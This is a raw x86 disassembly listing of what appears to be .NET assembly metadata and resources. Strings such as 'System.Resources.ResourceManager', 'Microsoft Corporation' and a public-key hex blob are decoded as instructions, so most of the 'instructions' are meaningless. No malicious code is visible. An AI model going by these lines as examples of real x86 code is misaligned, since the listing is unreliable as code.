  409fb4:	or     BYTE PTR ds:0x1e011912,dl
  409fba:	add    BYTE PTR ds:0x2298112,dl
  409fc0:	push   ds
  409fc1:	add    BYTE PTR [edx],al
  409fc3:	or     DWORD PTR [eax],esp
  409fc5:	add    BYTE PTR ds:0x12012512,dl
  409fcb:	and    DWORD PTR [ecx],0x81121508
  409fd1:	sub    eax,0x21811201
  409fd6:	pop    es
  409fd7:	adc    eax,0x12012512
  409fdc:	and    DWORD PTR [ecx],0x801200a
  409fe2:	adc    eax,0x12d8112
  409fe7:	adc    eax,DWORD PTR [eax]
  409fe9:	add    eax,0xe0e0200
  409fee:	push   cs
  409fef:	push   es
  409ff0:	and    BYTE PTR [ecx],al
  409ff2:	add    DWORD PTR [edx],edx
  409ff4:	cmp    DWORD PTR [ecx],0x1072014
  409ffa:	adc    ah,BYTE PTR [ecx]
  409ffc:	adc    eax,0x1418112
  40a001:	push   cs
  40a002:	or     BYTE PTR [edx],al
  40a004:	push   cs
  40a005:	adc    al,BYTE PTR [ecx+0x49811245]
  40a00b:	add    eax,0x81110000
  40a010:	dec    ebp
  40a011:	or     eax,0x1020130
  40a016:	adc    DWORD PTR [ecx+0x912154d],eax
  40a01c:	add    DWORD PTR [edx],edx
  40a01e:	or     eax,0x12010a05
  40a023:	adc    DWORD PTR [ecx+0x5],0xe010220
  40a02a:	or     DWORD PTR ds:0x13010120,eax
  40a030:	add    BYTE PTR [edi],al
  40a032:	adc    BYTE PTR [ecx],al
  40a034:	add    al,BYTE PTR [edx]
  40a036:	push   ds
  40a037:	add    BYTE PTR [esi],cl
  40a039:	add    al,0xa
  40a03b:	add    DWORD PTR [edx],edx
  40a03d:	and    DWORD PTR [ecx],ebp
  40a03f:	pop    es
  40a040:	or     al,0x12
  40a042:	and    DWORD PTR ds:0x12011912,edx
  40a048:	sbb    DWORD PTR ds:0xe0e4412,0x81123812
  40a052:	dec    ecx
  40a053:	adc    al,BYTE PTR [ecx-0x7eedeac3]
  40a059:	sub    DWORD PTR [edx],eax
  40a05b:	adc    al,BYTE PTR [ecx+0x4012021d]
  40a061:	adc    eax,0x8013911
  40a066:	sbb    eax,0x100061c
  40a06b:	or     DWORD PTR [edx],edx
  40a06d:	sbb    DWORD PTR ds:0x1215060a,0x12022981
  40a077:	sbb    DWORD PTR ds:0x1000609,0x1d811202
  40a081:	or     al,BYTE PTR [esi]
  40a083:	adc    eax,0x2298112
  40a088:	adc    al,BYTE PTR [ecx+0x3005021d]
  40a08e:	add    DWORD PTR [eax],eax
  40a090:	push   ds
  40a091:	add    BYTE PTR ds:0x8112010a,al
  40a097:	pop    ebp
  40a098:	add    eax,0x1251215
  40a09d:	push   cs
  40a09e:	or     DWORD PTR [eax],esp
  40a0a0:	add    BYTE PTR ds:0x1618111,dl
  40a0a6:	adc    eax,DWORD PTR [eax]
  40a0a8:	push   es
  40a0a9:	adc    eax,0x1618111
  40a0ae:	push   cs
  40a0af:	or     BYTE PTR [eax],dh
  40a0b1:	add    DWORD PTR [ebx],eax
  40a0b3:	add    DWORD PTR [esi],ecx
  40a0b5:	adc    ah,BYTE PTR [ecx]
  40a0b7:	add    dl,BYTE PTR [eax+eiz*1]
  40a0ba:	add    dl,BYTE PTR ds:0x1698112
  40a0c0:	adc    al,BYTE PTR [ecx+0x4d81116d]
  40a0c6:	adc    eax,0x12010912
  40a0cb:	xor    DWORD PTR [ecx+0xb],0x12150020
  40a0d2:	cmp    DWORD PTR [ecx+0x2],0x1d811208
  40a0d9:	or     DWORD PTR ds:0x2298112,edx
  40a0df:	adc    al,BYTE PTR [ecx+0x1019091d]
  40a0e5:	add    al,BYTE PTR [edx]
  40a0e7:	adc    eax,0x17d8112
  40a0ec:	push   ds
  40a0ed:	add    BYTE PTR ds:0x1e011912,dl
  40a0f3:	add    BYTE PTR ds:0x2298112,dl
  40a0f9:	push   ds
  40a0fa:	add    BYTE PTR [esi],bl
  40a0fc:	add    DWORD PTR [esi],eax
  40a0fe:	or     al,BYTE PTR [edx]
  40a100:	adc    al,BYTE PTR [ecx+0x2009091d]
  40a106:	add    DWORD PTR [ecx],eax
  40a108:	adc    eax,0x13011912
  40a10d:	add    BYTE PTR [ebx],cl
  40a10f:	and    BYTE PTR [ecx],al
  40a111:	add    DWORD PTR ds:0x1258112,edx
  40a117:	adc    al,BYTE PTR [ecx+0x6071b1d]
  40a11d:	adc    al,BYTE PTR [ecx+0x5d811259]
  40a123:	adc    eax,0xe012512
  40a128:	push   cs
  40a129:	adc    eax,0x12011912
  40a12e:	sbb    DWORD PTR ds:0x61811115,0x15070e01
  40a138:	adc    bl,BYTE PTR [ecx]
  40a13a:	add    DWORD PTR [edx],edx
  40a13c:	sbb    DWORD PTR ds:0x15002009,0x1818112
  40a146:	adc    eax,DWORD PTR [eax]
  40a148:	or     BYTE PTR ds:0x1818112,dl
  40a14e:	adc    al,BYTE PTR [ecx+0x2070d1d]
  40a154:	adc    al,BYTE PTR [ecx-0x7eedeae3]
  40a15a:	add    DWORD PTR [ecx],0x71d8112
  40a160:	and    BYTE PTR [eax],al
  40a162:	adc    eax,0xe012512
  40a167:	adc    DWORD PTR [edi],eax
  40a169:	add    eax,0x1251215
  40a16e:	push   cs
  40a16f:	push   cs
  40a170:	push   cs
  40a171:	adc    eax,0x1618111
  40a176:	push   cs
  40a177:	sbb    eax,0x1215071c
  40a17c:	sub    eax,0xe291102
  40a181:	pop    es
  40a182:	and    BYTE PTR [edx],al
  40a184:	add    DWORD PTR [ebx],edx
  40a186:	add    BYTE PTR [ebx],dl
  40a188:	add    DWORD PTR [eax+eiz*1],eax
  40a18b:	add    BYTE PTR [ecx],dl
  40a18d:	sub    DWORD PTR [esi],eax
  40a18f:	and    BYTE PTR [ecx],al
  40a191:	adc    eax,DWORD PTR [ecx]
  40a193:	adc    eax,DWORD PTR [eax]
  40a195:	push   es
  40a196:	and    BYTE PTR [ecx],al
  40a198:	adc    DWORD PTR [ecx],esi
  40a19a:	sbb    eax,0x100060e
  40a19f:	adc    al,BYTE PTR [ecx+0x7090e95]
  40a1a5:	add    al,0x12
  40a1a7:	add    ch,0xe
  40a1aa:	add    bl,BYTE PTR ds:0x220051c
  40a1b0:	add    cl,BYTE PTR [esi]
  40a1b2:	push   cs
  40a1b3:	push   es
  40a1b4:	adc    eax,0x1998112
  40a1b9:	push   cs
  40a1ba:	adc    DWORD PTR [eax],esi
  40a1bc:	add    DWORD PTR ds:0x150e001e,eax
  40a1c2:	adc    al,BYTE PTR [ecx+0x1e0199]
  40a1c8:	push   ds
  40a1c9:	add    BYTE PTR [esi],cl
  40a1cb:	push   cs
  40a1cc:	pop    es
  40a1cd:	adc    eax,0x1998112
  40a1d2:	adc    dh,BYTE PTR [esp+eax*1]
  40a1d5:	or     al,BYTE PTR [ecx]
  40a1d7:	adc    dh,BYTE PTR [edi+eax*1]
  40a1da:	adc    eax,0x1998112
  40a1df:	adc    dh,BYTE PTR ds:0x12010a04
  40a1e5:	xor    eax,0x1d05070c
  40a1ea:	sbb    al,0x1d
  40a1ec:	sbb    al,0x1d
  40a1ee:	sbb    al,0x1d
  40a1f0:	sbb    al,0x1d
  40a1f2:	sbb    al,0x6
  40a1f4:	and    BYTE PTR [ecx],al
  40a1f6:	add    DWORD PTR [edx],edx
  40a1f8:	and    DWORD PTR [ecx+0x12010704],0x2000635
  40a202:	add    cl,BYTE PTR [esi]
  40a204:	adc    BYTE PTR [eax],cl
  40a206:	add    eax,DWORD PTR [edi]
  40a208:	add    DWORD PTR [eax],ecx
  40a20a:	push   es
  40a20b:	adc    BYTE PTR [ecx],al
  40a20d:	add    DWORD PTR [esi],ebx
  40a20f:	add    BYTE PTR [esi],cl
  40a211:	or     BYTE PTR [edi],al
  40a213:	add    edx,DWORD PTR [edx]
  40a215:	add    ch,0x2
  40a218:	sbb    eax,0x100081c
  40a21d:	adc    al,BYTE PTR [eax-0x3a7fed3b]
  40a223:	add    eax,0x28110207
  40a228:	or     BYTE PTR [ebx],al
  40a22a:	pop    es
  40a22b:	add    DWORD PTR [edx],eax
  40a22d:	add    eax,0x3d120100
  40a232:	or     BYTE PTR [esi],al
  40a234:	add    BYTE PTR [ecx],al
  40a236:	sbb    eax,0x130e3d12
  40a23b:	pop    es
  40a23c:	add    eax,0x153d121d
  40a241:	adc    DWORD PTR [ecx],edi
  40a243:	add    DWORD PTR [eax],ecx
  40a245:	adc    eax,0x8013911
  40a24a:	sbb    eax,0x41c1d1c
  40a24f:	add    BYTE PTR [ecx],al
  40a251:	add    DWORD PTR [edx],eax
  40a253:	add    eax,DWORD PTR [eax]
  40a255:	add    BYTE PTR [edx],al
  40a257:	add    al,0x0
  40a259:	add    BYTE PTR [edx],dl
  40a25b:	inc    ecx
  40a25c:	pop    es
  40a25d:	and    BYTE PTR [edx],al
  40a25f:	add    DWORD PTR [ecx],edx
  40a261:	cmp    BYTE PTR [ecx+0x1215080e],0x81
  40a268:	lods   eax,DWORD PTR ds:[esi]
  40a269:	add    DWORD PTR [edx],edx
  40a26b:	cmp    DWORD PTR [ecx],0x11002005
  40a271:	xor    DWORD PTR [ecx+0x1203000b],0x3512b581
  40a27b:	adc    al,BYTE PTR [ebp+0x11]
  40a27e:	dec    ecx
  40a27f:	add    eax,0x81120020
  40a284:	mov    ecx,0x12052010
  40a289:	cmp    DWORD PTR [ebp+0xeb58112],0xb981120e
  40a293:	adc    al,BYTE PTR [ecx+0x2004b9]
  40a299:	sbb    eax,0x5000f0e
  40a29e:	adc    ah,BYTE PTR [ecx]
  40a2a0:	adc    dh,BYTE PTR ds:0x12154512
  40a2a6:	and    eax,0x80e0e01
  40a2ab:	and    al,BYTE PTR [edi]
  40a2ad:	or     cl,BYTE PTR [esi]
  40a2af:	adc    al,BYTE PTR [ecx-0x3a7fed43]
  40a2b5:	adc    eax,0x1098112
  40a2ba:	adc    al,BYTE PTR [ecx-0x467feef3]
  40a2c0:	adc    bh,BYTE PTR ds:0x15c58012
  40a2c6:	adc    ah,BYTE PTR ds:0x21120e01
  40a2cc:	adc    DWORD PTR [eax],esi
  40a2ce:	add    al,0x20
  40a2d0:	add    DWORD PTR [esi],ecx
  40a2d2:	or     BYTE PTR ds:0x49110100,al
  40a2d8:	push   cs
  40a2d9:	add    al,0x20
  40a2db:	add    BYTE PTR [ecx],dl
  40a2dd:	dec    ecx
  40a2de:	add    eax,DWORD PTR [edi]
  40a2e0:	add    DWORD PTR [esi],ecx
  40a2e2:	inc    eax
  40a2e3:	add    DWORD PTR [eax],eax
  40a2e5:	xor    edx,DWORD PTR [ebx+0x79]
  40a2e8:	jae    0x40a35e
  40a2ea:	gs ins DWORD PTR es:[edi],dx
  40a2ec:	cs push edx
  40a2ee:	gs jae 0x40a360
  40a2f1:	jne    0x40a365
  40a2f3:	arpl   WORD PTR [ebp+0x73],sp
  40a2f6:	cs push esp
  40a2f8:	outs   dx,DWORD PTR ds:[esi]
  40a2f9:	outs   dx,DWORD PTR ds:[esi]
  40a2fa:	ins    BYTE PTR es:[edi],dx
  40a2fb:	jae    0x40a32b
  40a2fd:	push   ebx
  40a2fe:	je     0x40a372
  40a300:	outs   dx,DWORD PTR ds:[esi]
  40a301:	outs   dx,BYTE PTR ds:[esi]
  40a302:	ins    BYTE PTR es:[di],dx
  40a304:	jns    0x40a35a
  40a306:	jns    0x40a378
  40a308:	gs fs push edx
  40a30b:	gs jae 0x40a37d
  40a30e:	jne    0x40a382
  40a310:	arpl   WORD PTR [ebp+0x42],sp
  40a313:	jne    0x40a37e
  40a315:	ins    BYTE PTR es:[edi],dx
  40a316:	fs gs jb 0x40a321
  40a31a:	xor    al,0x2e
  40a31c:	xor    BYTE PTR [esi],ch
  40a31e:	xor    BYTE PTR [esi],ch
  40a320:	xor    BYTE PTR [eax],al
  40a322:	add    BYTE PTR ds:0x1c020200,al
  40a328:	sbb    al,0x8
  40a32a:	add    BYTE PTR [ecx],al
  40a32c:	adc    al,BYTE PTR [eax-0x327eee2b]
  40a332:	add    eax,0x80120020
  40a337:	fld    DWORD PTR [edi]
  40a339:	and    BYTE PTR [edx],al
  40a33b:	add    DWORD PTR [esi],ecx
  40a33d:	adc    al,BYTE PTR [eax+0x10704d9]
  40a343:	adc    cl,BYTE PTR [ebp+0x6]
  40a346:	and    BYTE PTR [edx],al
  40a348:	push   cs
  40a349:	push   cs
  40a34a:	adc    dl,BYTE PTR [ecx+0x6]
  40a34d:	and    BYTE PTR [ecx],al
  40a34f:	add    DWORD PTR [ecx],edx
  40a351:	adc    ebp,0x2000108
  40a357:	add    BYTE PTR [eax],al
  40a359:	add    BYTE PTR [eax],al
  40a35b:	add    BYTE PTR [edi],dh
  40a35d:	add    DWORD PTR [eax],eax
  40a35f:	sbb    ch,BYTE PTR [esi]
  40a361:	dec    esi
  40a362:	inc    ebp
  40a363:	push   esp
  40a364:	inc    esi
  40a365:	jb     0x40a3c8
  40a367:	ins    DWORD PTR es:[edi],dx
  40a368:	gs ja  0x40a3da
  40a36b:	jb     0x40a3d8
  40a36d:	sub    al,0x56
  40a36f:	gs jb  0x40a3e5
  40a372:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40a379:	xor    eax,0xe540001
  40a37e:	adc    al,0x46
  40a380:	jb     0x40a3e3
  40a382:	ins    DWORD PTR es:[edi],dx
  40a383:	gs ja  0x40a3f5
  40a386:	jb     0x40a3f3
  40a388:	inc    esp
  40a389:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  40a390:	popa   
  40a391:	ins    DWORD PTR es:[edi],dx
  40a392:	add    BYTE PTR gs:0x1,al
  40a399:	add    BYTE PTR [eax],bl
  40a39b:	add    DWORD PTR [eax],eax
  40a39d:	adc    eax,DWORD PTR [ebx+0x76]
  40a3a0:	inc    ebx
  40a3a1:	outs   dx,DWORD PTR ds:[esi]
  40a3a2:	ins    BYTE PTR es:[edi],dx
  40a3a3:	ins    BYTE PTR es:[edi],dx
  40a3a4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40a3a9:	outs   dx,BYTE PTR ds:[esi]
  40a3aa:	inc    ebx
  40a3ab:	ins    DWORD PTR es:[edi],dx
  40a3ac:	fs cs gs js 0x40a416
  40a3b1:	add    BYTE PTR [eax],al
  40a3b3:	sbb    al,BYTE PTR [ecx]
  40a3b5:	add    BYTE PTR ds:0x7263694d,dl
  40a3bb:	outs   dx,DWORD PTR ds:[esi]
  40a3bc:	jae    0x40a42d
  40a3be:	data16 je 0x40a3e1
  40a3c1:	inc    ebx
  40a3c2:	outs   dx,DWORD PTR ds:[esi]
  40a3c3:	jb     0x40a435
  40a3c5:	outs   dx,DWORD PTR ds:[esi]
  40a3c6:	jb     0x40a429
  40a3c8:	je     0x40a433
  40a3ca:	outs   dx,DWORD PTR ds:[esi]
  40a3cb:	outs   dx,BYTE PTR ds:[esi]
  40a3cc:	add    BYTE PTR [eax],al
  40a3ce:	and    eax,0x4d200001
  40a3d3:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a3da:	je     0x40a39e
  40a3dc:	scas   al,BYTE PTR es:[edi]
  40a3dd:	and    BYTE PTR [esi+0x69],dl
  40a3e0:	jae    0x40a457
  40a3e2:	popa   
  40a3e3:	ins    BYTE PTR es:[edi],dx
  40a3e4:	and    BYTE PTR [ebx+0x74],dl
  40a3e7:	jne    0x40a44d
  40a3e9:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  40a3f0:	xor    DWORD PTR [edx],esi
  40a3f2:	add    BYTE PTR [eax],al
  40a3f4:	xor    eax,DWORD PTR [ecx]
  40a3f6:	add    BYTE PTR [esi],ch
  40a3f8:	ret    0x20a9
  40a3fb:	dec    ebp
  40a3fc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a403:	je     0x40a425
  40a405:	inc    ebx
  40a406:	outs   dx,DWORD PTR ds:[esi]
  40a407:	jb     0x40a479
  40a409:	outs   dx,DWORD PTR ds:[esi]
  40a40a:	jb     0x40a46d
  40a40c:	je     0x40a477
  40a40e:	outs   dx,DWORD PTR ds:[esi]
  40a40f:	outs   dx,BYTE PTR ds:[esi]
  40a410:	and    BYTE PTR cs:[ecx+0x6c],al
  40a414:	ins    BYTE PTR es:[edi],dx
  40a415:	and    BYTE PTR [edx+0x69],dh
  40a418:	addr16 push 0x72207374
  40a41e:	gs jae 0x40a486
  40a421:	jb     0x40a499
  40a423:	gs fs add BYTE PTR cs:[eax],al
  40a428:	adc    DWORD PTR [ecx],eax
  40a42a:	add    BYTE PTR [ecx+esi*1],cl
  40a42d:	xor    DWORD PTR [esi],ebp
  40a42f:	xor    BYTE PTR [esi],ch
  40a431:	xor    eax,0x37323730
  40a436:	xor    DWORD PTR cs:[eax],eax
  40a439:	add    BYTE PTR ds:0x31080001,cl
  40a43f:	xor    DWORD PTR [esi],ebp
  40a441:	xor    BYTE PTR [esi],ch
  40a443:	xor    BYTE PTR [esi],ch
  40a445:	xor    BYTE PTR [eax],al
  40a447:	add    BYTE PTR [ebx],cl
  40a449:	add    DWORD PTR [eax],eax
  40a44b:	add    ah,BYTE PTR [ebp+0x6e]
  40a44e:	add    DWORD PTR [eax],eax
  40a450:	add    BYTE PTR [eax],al
  40a452:	add    BYTE PTR [eax],al
  40a454:	add    eax,0x10001
  40a459:	add    BYTE PTR [edx],ch
  40a45b:	add    DWORD PTR [eax],eax
  40a45d:	and    eax,0x645c3a46
  40a462:	fs pop esp
  40a464:	je     0x40a4d5
  40a466:	outs   dx,DWORD PTR ds:[esi]
  40a467:	ins    BYTE PTR es:[edi],dx
  40a468:	jae    0x40a4c6
  40a46a:	fs gs jbe 0x40a4d2
  40a46e:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  40a475:	ins    BYTE PTR es:[edi],dx
  40a476:	push   eax
  40a477:	jne    0x40a4db
  40a479:	ins    BYTE PTR es:[edi],dx
  40a47a:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40a481:	outs   dx,BYTE PTR ds:[esi]
  40a482:	imul   eax,DWORD PTR [eax],0x0
  40a485:	or     DWORD PTR [eax+0x1],0x0
  40a489:	add    BYTE PTR [eax+0x30],0x30
  40a48d:	xor    dh,BYTE PTR [eax+esi*1]
  40a490:	xor    BYTE PTR [eax],dh
  40a492:	xor    BYTE PTR [eax],dh
  40a494:	arpl   WORD PTR [eax],di
  40a496:	xor    BYTE PTR [eax],dh
  40a498:	xor    BYTE PTR [eax],dh
  40a49a:	xor    BYTE PTR [ecx],dh
  40a49c:	xor    al,0x30
  40a49e:	xor    DWORD PTR [eax],esi
  40a4a0:	xor    BYTE PTR [eax],dh
  40a4a2:	xor    BYTE PTR [eax],dh
  40a4a4:	xor    BYTE PTR ss:[edx],dh
  40a4a7:	xor    BYTE PTR [eax],dh
  40a4a9:	xor    BYTE PTR [eax],dh
  40a4ab:	xor    BYTE PTR [eax],dh
  40a4ad:	xor    dh,BYTE PTR [eax+esi*1]
  40a4b0:	xor    BYTE PTR [eax],dh
  40a4b2:	xor    BYTE PTR ds:0x34333532,dh
  40a4b8:	xor    DWORD PTR [ebx],esi
  40a4ba:	xor    DWORD PTR [eax],esi
  40a4bc:	xor    BYTE PTR [eax],dh
  40a4be:	cmp    BYTE PTR [eax],dh
  40a4c0:	xor    BYTE PTR [eax],dh
  40a4c2:	xor    BYTE PTR [eax],dh
  40a4c4:	xor    DWORD PTR [eax],esi
  40a4c6:	xor    BYTE PTR [eax],dh
  40a4c8:	xor    DWORD PTR [eax],esi
  40a4ca:	xor    BYTE PTR [esi],dh
  40a4cc:	xor    DWORD PTR [ebx],esi
  40a4ce:	xor    edi,DWORD PTR [ecx]
  40a4d0:	cmp    DWORD PTR [ecx+0x66],esp
  40a4d3:	xor    WORD PTR [eax],di
  40a4d6:	xor    WORD PTR gs:[ecx+0x32],sp
  40a4db:	arpl   WORD PTR [edx],si
  40a4dd:	xor    eax,0x32613431
  40a4e2:	aaa    
  40a4e3:	xor    esp,DWORD PTR [ecx+0x34]
  40a4e6:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  40a4ea:	xor    al,0x32
  40a4ec:	bound  esi,QWORD PTR [edi]
  40a4ee:	xor    dh,BYTE PTR [ebx]
  40a4f0:	xor    dh,BYTE PTR [ecx]
  40a4f2:	xor    WORD PTR [edi],si
  40a4f5:	xor    eax,0x32303137
  40a4fa:	cmp    WORD PTR fs:[ebp+0x62],sp
  40a4ff:	popa   
  40a500:	fs popa 
  40a502:	cmp    DWORD PTR ss:[ecx],edi
  40a505:	xor    dh,BYTE PTR [ebx]
  40a507:	xor    dh,BYTE PTR gs:[edi]
  40a50a:	xor    edi,DWORD PTR [eax]
  40a50c:	xor    al,0x30
  40a50e:	arpl   WORD PTR ss:[edx],si
  40a511:	xor    DWORD PTR [ebp+0x35],esp
  40a514:	bound  edi,QWORD PTR [eax]
  40a516:	xor    BYTE PTR [ecx],dh
  40a518:	xor    eax,0x62613235
  40a51d:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  40a521:	xor    BYTE PTR [ecx+0x36],ah
  40a524:	xor    eax,0x35333261
  40a529:	xor    BYTE PTR gs:[eax],dh
  40a52c:	xor    DWORD PTR [ecx+0x63],esp
  40a52f:	cmp    DWORD PTR [ecx+0x64],esp
  40a532:	arpl   WORD PTR [edx],si
  40a534:	xor    eax,0x38643266
  40a539:	xor    DWORD PTR [ecx],esi
  40a53b:	bound  esi,QWORD PTR gs:[eax]
  40a53e:	cmp    DWORD PTR [ecx+edi*1],esi
  40a541:	ss popa 
  40a543:	xor    al,0x63
  40a545:	ss popa 
  40a547:	xor    eax,0x36346439
  40a54c:	xor    DWORD PTR [ecx],edi
  40a54e:	xor    eax,0x36633938
  40a553:	cmp    DWORD PTR [esi+0x35],esp
  40a556:	bound  esp,QWORD PTR [ecx+0x66]
  40a559:	xor    BYTE PTR [ebx+0x34],ah
  40a55c:	xor    DWORD PTR [edi],esi
  40a55e:	cmp    DWORD PTR [ecx+0x34],esp
  40a561:	aaa    
  40a562:	xor    esi,DWORD PTR [ecx]
  40a564:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  40a568:	xor    eax,0x64633535
  40a56d:	xor    BYTE PTR [eax],dh
  40a56f:	ss popa 
  40a571:	arpl   WORD PTR [ebx+0x38],sp
  40a574:	bound  esi,QWORD PTR ds:0x66393539
  40a57a:	xor    ah,BYTE PTR [edx+0x64]
  40a57d:	ss xor DWORD PTR gs:[eax],esi
  40a581:	xor    esi,DWORD PTR gs:[esi]
  40a584:	xor    BYTE PTR [ebx+0x33],ah
  40a587:	xor    al,0x35
  40a589:	xor    esi,DWORD PTR [edi]
  40a58b:	popa   
  40a58c:	xor    DWORD PTR [edx+esi*1+0x36],esp
  40a590:	ss fs popa 
  40a593:	cmp    BYTE PTR [eax],dh
  40a595:	cmp    BYTE PTR ds:0x35363538,dh
  40a59b:	cmp    BYTE PTR [ebx],dh
  40a59d:	arpl   WORD PTR [eax],di
  40a59f:	xor    eax,0x64313864
  40a5a4:	popa   
  40a5a5:	aaa    
  40a5a6:	xor    sp,WORD PTR [ebp+0x63]
  40a5aa:	xor    BYTE PTR [ecx],dh
  40a5ac:	gs cmp DWORD PTR fs:0x35633436,esi
  40a5b4:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  40a5b8:	fs aaa 
  40a5ba:	xor    DWORD PTR [ebx],esi
  40a5bc:	arpl   WORD PTR [eax+esi*1+0x31],sp
  40a5c0:	aaa    
  40a5c1:	xor    ah,BYTE PTR [ebx+0x38]
  40a5c4:	xor    dh,BYTE PTR gs:[ebx]
  40a5c7:	popa   
  40a5c8:	xor    DWORD PTR [eax],esi
  40a5ca:	data16 xor BYTE PTR [edx],dh
  40a5cd:	xor    edi,DWORD PTR [ecx]
  40a5cf:	bound  edi,QWORD PTR [eax]
  40a5d1:	xor    BYTE PTR [ebx+0x39],ah
  40a5d4:	bound  esi,QWORD PTR ss:[eax]
  40a5d7:	aaa    
  40a5d8:	aaa    
  40a5d9:	xor    esi,DWORD PTR [esi]
  40a5db:	xor    ax,0x3864
  40a5df:	bound  esi,QWORD PTR [eax]
  40a5e1:	xor    dh,BYTE PTR [edx]
  40a5e3:	xor    eax,0x34613234
  40a5e8:	gs aaa 
  40a5ea:	xor    al,0x32
  40a5ec:	xor    eax,0x66356131
  40a5f1:	xor    al,0x33
  40a5f3:	xor    bh,BYTE PTR [eax]
  40a5f5:	xor    dh,BYTE PTR [ebx+esi*1]
  40a5f8:	xor    DWORD PTR [eax],edi
  40a5fa:	bound  esi,QWORD PTR [ebx]
  40a5fc:	xor    eax,0x35613933
  40a601:	popa   
  40a602:	xor    BYTE PTR [eax],bh
  40a604:	aaa    
  40a605:	data16 cmp BYTE PTR [ebp+0x35],ah
  40a609:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  40a60d:	xor    DWORD PTR [ebx],esi
  40a60f:	xor    eax,0x61633966
  40a614:	xor    al,0x37
  40a616:	xor    sp,WORD PTR [edx+0x62]
  40a61a:	xor    ah,BYTE PTR [ebp+0x31]
  40a61d:	xor    BYTE PTR [ecx+0x66],ah
  40a620:	data16 xor BYTE PTR [ecx+0x66],ah
  40a624:	xor    BYTE PTR [eax],bh
  40a626:	xor    al,0x39
  40a628:	xor    eax,0x62663430
  40a62d:	aaa    
  40a62e:	arpl   WORD PTR [ebp+0x61],sp
  40a631:	xor    esp,DWORD PTR [esi+0x66]
  40a634:	xor    DWORD PTR [ecx],edi
  40a636:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  40a63a:	fs xor BYTE PTR gs:[ebp+0x64],ah
  40a63f:	popa   
  40a640:	fs ss xor al,0x63
  40a644:	cmp    BYTE PTR ss:[ebp+0x66],ah
  40a648:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  40a64d:	xor    eax,0x30336436
  40a652:	xor    ah,BYTE PTR [ecx+0x64]
  40a655:	xor    eax,0x36646635
  40a65a:	cmp    BYTE PTR gs:[eax],dh
  40a65d:	xor    si,WORD PTR [eax]
  40a660:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  40a664:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  40a669:	cmp    DWORD PTR gs:0x38353633,esi
  40a670:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  40a678:	bound  esi,QWORD PTR ds:0x63363366
  40a67e:	xor    eax,0x66653234
  40a683:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  40a688:	data16 cmp BYTE PTR [eax],bh
  40a68b:	cmp    BYTE PTR ds:0x33643833,dh
  40a691:	aaa    
  40a692:	xor    al,0x63
  40a694:	xor    WORD PTR gs:[eax],si
  40a698:	ss popa 
  40a69a:	arpl   WORD PTR [esi+0x37],sp
  40a69d:	cmp    DWORD PTR fs:[ebx],esi
  40a6a0:	popa   
  40a6a1:	xor    al,0x34
  40a6a3:	xor    al,0x35
  40a6a5:	arpl   WORD PTR [ebx],si
  40a6a7:	arpl   WORD PTR [edi],si
  40a6a9:	xor    esp,DWORD PTR [ebx+0x64]
  40a6ac:	cmp    DWORD PTR [ecx],esi
  40a6ae:	xor    DWORD PTR [esi+0x30],esp
  40a6b1:	xor    eax,0x61613137
  40a6b6:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  40a6bb:	fs popa 
  40a6bd:	xor    DWORD PTR [edx],esi
  40a6bf:	bound  esi,QWORD PTR [ecx]
  40a6c1:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  40a6c5:	arpl   WORD PTR [ebx],si
  40a6c7:	aaa    
  40a6c8:	xor    eax,0x813362
  40a6cd:	popa   
  40a6ce:	xor    eax,0x36363861
  40a6d3:	xor    DWORD PTR gs:[ebp+0x65],esp
  40a6d7:	xor    DWORD PTR [eax],edi
  40a6d9:	data16 cmp BYTE PTR ss:[eax],dh
  40a6dd:	aaa    
  40a6de:	ss cmp BYTE PTR ss:[edx],dh
  40a6e2:	xor    BYTE PTR [ecx],bh
  40a6e4:	xor    sp,WORD PTR [edx+0x31]
  40a6e8:	xor    DWORD PTR [edx],esi
  40a6ea:	xor    esi,DWORD PTR [esi]
  40a6ec:	popa   
  40a6ed:	arpl   WORD PTR [ebp+0x35],sp
  40a6f0:	xor    dh,BYTE PTR gs:[ecx]
  40a6f3:	xor    WORD PTR [ecx],si
  40a6f6:	aaa    
  40a6f7:	cmp    BYTE PTR [eax],dh
  40a6f9:	xor    esp,DWORD PTR [ecx+0x33]
  40a6fc:	xor    DWORD PTR [ebx+esi*1],esi
  40a6ff:	popa   
  40a700:	bound  esp,QWORD PTR [edx+0x31]
  40a703:	xor    dh,BYTE PTR [esi]
  40a705:	fs xor BYTE PTR fs:[ebx],dh
  40a709:	xor    eax,0x32643764
  40a70e:	data16 cmp BYTE PTR [edi],dh
  40a711:	bound  esi,QWORD PTR ss:[esi]
  40a714:	cmp    DWORD PTR [ebx],esi
  40a716:	cmp    BYTE PTR [ecx+0x61],ah
  40a719:	data16 xor ah,BYTE PTR [ebp+0x65]
  40a71d:	xor    esi,DWORD PTR [ecx+esi*1]
  40a720:	xor    al,0x64
  40a722:	xor    eax,0x64303234
  40a727:	aaa    
  40a728:	xor    eax,0x31323633
  40a72d:	xor    al,0x30
  40a72f:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  40a733:	xor    al,0x61
  40a735:	xor    al,0x39
  40a737:	arpl   WORD PTR [eax+edi*1],si
  40a73a:	arpl   WORD PTR ss:[ebp+0x31],sp
  40a73e:	xor    esi,DWORD PTR [ebx+esi*1]
  40a741:	xor    BYTE PTR [eax],dh
  40a743:	popa   
  40a744:	xor    dh,BYTE PTR [ecx]
  40a746:	xor    BYTE PTR [esi],dh
  40a748:	popa   
  40a749:	bound  esi,QWORD PTR fs:[esi]
